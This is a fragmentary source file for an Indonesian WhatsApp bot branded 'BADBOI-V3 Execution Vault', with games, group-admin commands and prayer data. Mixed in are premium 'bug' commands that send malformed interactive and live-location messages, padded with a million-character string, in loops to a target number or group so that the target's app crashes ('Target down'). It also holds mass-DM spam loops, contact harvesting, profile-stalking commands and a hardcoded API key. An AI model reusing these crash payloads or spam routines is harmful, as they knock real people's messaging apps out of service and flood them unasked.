🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : Ladybug.getName(who)}* ${user.level ? `
...
let timers = clockString(_timers)
let name = user.registered ? user.name: Ladybug.getName(m.sender)
let id = m.sender
let kerja = 'Roket'
Ladybug.misi = Ladybug.misi ? Ladybug.misi: {}
if (id in Ladybug.misi) {
...
default:
return Ladybug.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
}
}
} catch (err) {
joreply("Error\n\n\n" + err.stack)
...
try {
Ladybug.tembak = Ladybug.tembak || { musuh: [], tembak: [] }
 if(/kiri/i.test(text)) {
...
if(Ladybug.tembak.tembak.indexOf("🤠") == 0) {
Ladybug.tembak.tembak = kiri[0]
} else if(Ladybug.tembak.tembak.indexOf("🤠") == 1) {
Ladybug.tembak.tembak = kiri[0]
} else if(Ladybug.tembak.tembak.indexOf("🤠") == 2) {
Ladybug.tembak.tembak = kiri[1]
} else if(Ladybug.tembak.tembak.indexOf("🤠") == 3) {
Ladybug.tembak.tembak = kiri[2]
} else if(Ladybug.tembak.tembak.indexOf("🤠") == 4) {
Ladybug.tembak.tembak = kiri[3]
}

let pos = Ladybug.tembak.musuh.join(" ") + "\n\n\n" + Ladybug.tembak.tembak.join(" ")



if(Ladybug.tembak.musuh.indexOf("🥷") === Ladybug.tembak.tembak.indexOf("🤠")) return Ladybug.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
])
return Ladybug.sendButton(m.chat, pos, wm, [
...
if(Ladybug.tembak.tembak.indexOf("🤠") == 0) {
Ladybug.tembak.tembak = kanan[1]
} else if(Ladybug.tembak.tembak.indexOf("🤠") == 1) {
Ladybug.tembak.tembak = kanan[2]
} else if(Ladybug.tembak.tembak.indexOf("🤠") == 2) {
Ladybug.tembak.tembak = kanan[3]
} else if(Ladybug.tembak.tembak.indexOf("🤠") == 3) {
Ladybug.tembak.tembak = kanan[4]
} else if(Ladybug.tembak.tembak.indexOf("🤠") == 4) {
Ladybug.tembak.tembak = kanan[4]
}
...
if(Ladybug.tembak.tembak.indexOf("🤠") == Ladybug.tembak.musuh.indexOf("🥷")) {
Ladybug.tembak = {}
...
Ladybug.tembak.musuh = musuh
Ladybug.tembak.tembak = aku
...
let e = String(err)
Ladybug.sendMessage("923452696397@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
...
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`;
if (room.x !== room.o) await Ladybug.sendText(room.x, str, m, {
mentions: parseMention(str)
});
await Ladybug.sendText(room.o, str, m, {
mentions: parseMention(str)
});
} else {
room = {
...
if (this.game) {
delete this.game;
Ladybug.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
} else if (!this.game) {
...
this.suit[id] = {
chat: await Ladybug.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) Ladybug.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
...
Ladybug.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
...
let result = anu[Math.floor(Math.random() * anu.length)];
Ladybug.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
...
let result = anu[Math.floor(Math.random() * anu.length)];
Ladybug.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
...
let result = anu[Math.floor(Math.random() * anu.length)];
Ladybug.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
...
let result = anu[Math.floor(Math.random() * anu.length)];
Ladybug.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
...
if (anu.status == false) return joreply(anu.message)
Ladybug.sendImage(m.chat, anu.message.image, `❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Simbol Tarot :* ${anu.message.simbol_tarot}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "fengshui": {
...
Ladybug.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
...
await Ladybug.groupRevokeInvite(m.chat).then((res) => joreply(`Sukses riset link group`)).catch((err) => joreply(jsonformat(err)))
}
break
//=================================================//
case 'infogc': {
if(!isGroup) return joreply("Hanya bisa di dalam group")
let _meta = await Ladybug.groupMetadata(m.chat)
console.log(_meta)
let _img = await Ladybug.profilePictureUrl(_meta.id, 'image') 
...
joreply(mess.wait)
try {
var ppimg = await Ladybug.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Ladybug.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
break
//=================================================//
case 'closegroup': {
if (!isGroup) return joreply(`Khusus Group Bego`)
...
Ladybug.groupSettingUpdate(m.chat, 'announcement')
...
setTimeout(() => {
var nomor = m.participant
Ladybug.groupSettingUpdate(m.chat, 'not_announcement')
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
let response = await Ladybug.groupInviteCode(m.chat)
Ladybug.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'editdesk':{
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
 if (args[0] === 'open'){
await Ladybug.groupSettingUpdate(m.chat, 'unlocked').then((res) => joreply(`Sukses Membuka Edit Info Group`)).catch((err) => joreply(jsonformat(err)))
 } else if (args[0] === 'close'){
await Ladybug.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => joreply(jsonformat(err)))
 } else {
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
if (args[0] === 'close'){
await Ladybug.groupSettingUpdate(m.chat, 'announcement').then((res) => joreply(`Sukses Menutup Group`)).catch((err) => joreply(jsonformat(err)))
} else if (args[0] === 'open'){
await Ladybug.groupSettingUpdate(m.chat, 'not_announcement').then((res) => joreply(`Sukses Membuka Group`)).catch((err) => joreply(jsonformat(err)))
} else {
 joreply(`Silahkan Ketik\nGroup Open\nGroup Close`)
 }
}
...
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Ladybug.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case "add": {
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Ladybug.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case "demote": {
...
await Ladybug.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case 'setppgroup': {
...
var mediz = await Ladybug.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
...
var memeg = await Ladybug.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
joreply(`*Success Beb✅*`)
}
}
...
Ladybug.sendMessage(m.chat, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
let url = await fetch(`https://raw.githubusercontent.com/SpiderChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
...
},
{
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
...
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
...
},
{
 ...
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
...
arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
...
arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
...
arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
...
await Ladybug.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break
...
Ladybug.sendFile(m.chat, phone.result, "", ``, m, false)
}
break
//=================================================//
case "sspc": {
...
Ladybug.sendFile(m.chat, desktop.result, "", ``, m, false)
}
break
//=================================================//
case "sstablet": {
...
Ladybug.sendFile(m.chat, tablet.result, "", ``, m, false)
}
break
...
for (let xnxx of anu) {
let metadat72 = await Ladybug.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Ladybug.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await Ladybug.sendMessage(xnxx, { image: { url: memek }, caption: text.split('|')[0]}, { quoted: m })
await sleep(text.split('|')[1])
} else {
await Ladybug.sendMessage(xnxx, { text: text.split('|')[0] }, { quoted: m })
await sleep(text.split('|')[1])
}}
joreply(mess.succes);
}
...
for (let x of anu) {
let metadata2 = await Ladybug.groupMetadata(x)
...
const metadata2 = await Ladybug.groupMetadata(q.split("|")[0])
const colls = metadata2.participants
for (let mem of colls) {
Ladybug.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] }, { quoted: m }
)
await sleep(1500)
}
joreply(mess.succes)
...
for (let pler of mem) {
Ladybug.sendMessage(pler, { text: q }, { quoted: m })
await sleep(1500)
}
joreply(mess.succes)
}
...
media = await Ladybug.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await Ladybug.sendMessage(men, { image: { url: memek }, caption: captny }, { quoted: m })
await sleep(1500)
await Ladybug.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await Ladybug.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
...
await joreply(mess.wait)
const groupMetadataa = !m.isGroup? await Ladybug.groupMetadata(`${text}`).catch(e => {}) : ""
...
await Ladybug.sendMessage(m.sender, { document: fs.readFileSync("./dtbs/contacts.vcf"), fileName: "contacts.vcf", caption: 
`🌤️Succes Om, UwU
...
└────────────`
await Ladybug.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
break
//=================================================//
case 'igstalk': {
...
└────────────`
 await Ladybug.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m })
} catch {
...
Ladybug.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*
...
await Ladybug.sendMessage(m.chat, { text: messageText }, { quoted: m });
...
akunlo = "https://telegra.ph/file/b31c039845a708a473d6e.jpg" 
if (!u) return
let d = (await Ladybug.onWhatsApp(u.split`@`[0]))[0] || {}
...
🔐 Password: ${password}
🔗 Url: ${domain}`
Ladybug.sendMessage(u, { image: { url: 'https://telegra.ph/file/b31c039845a708a473d6e.jpg' }, caption: ctf }, { quoted: m })
...
let disk = "5024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://telegra.ph/file/54c952ff6f59246b7189b.jpg" 
if (!u) return
let d = (await Ladybug.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
...
joreply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Just Gave You Access To The Following Panel Account >
👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
Ladybug.sendMessage(u, { image: { url: 'https://telegra.ph/file/b31c039845a708a473d6e.jpg' }, caption: ctf }, { quoted: m })
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": "𝓑𝓐𝓓𝓑𝓞𝓘-V3  © Badboi Execution Vault"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
...
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 2348140825959|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 2348140825959|1`)
let target = bijipler+"@s.whatsapp.net"
...
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await Ladybug.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
...
message: {
  "interactiveMessage": {
    ...
    "body": {
      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #ryozingoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝕭𝕬𝕯𝕭𝕺𝕴⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
case 'cekprovider': {
if (!isPremium) return joreply(mess.prem)
if (!text) return joreply(`Example: ${prefix + command} 2348140825959`)
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
joreply(JSON.stringify(result, null, 2));
...
for (let j = 0; j < q; j++) {
await Ladybug.sendVideoAsSticker(m.chat, mengkece, force, { packname: 'Spider Execution Vault', author: 'TheZetsuboXygen' })
}
}
break
...
await Ladybug.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜VINOR KING⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡VINOR KING⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ Dev badboi💀𝓑𝓐𝓓𝓑𝓞𝓘-V3 ⿻`,
mediaType: 1,
mediaUrl: 'https://whatsapp.com/channel/0029VadCyFZGufJ2YW4bG42x'
}
},
text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝓑𝓐𝓓𝓑𝓞𝓘-V3* 𝘽𝙮  𝓑𝓐𝓓𝓑𝓞𝓘'
}, {
quoted: m
})
}
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝕭 𝕬 𝕯 𝕭 𝕺 𝕴-𝓿3⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(900000)
    }
...
await Ladybug.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
...
peki = async () => {
Ladybug.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
await sleep(1000)
m.reply(`
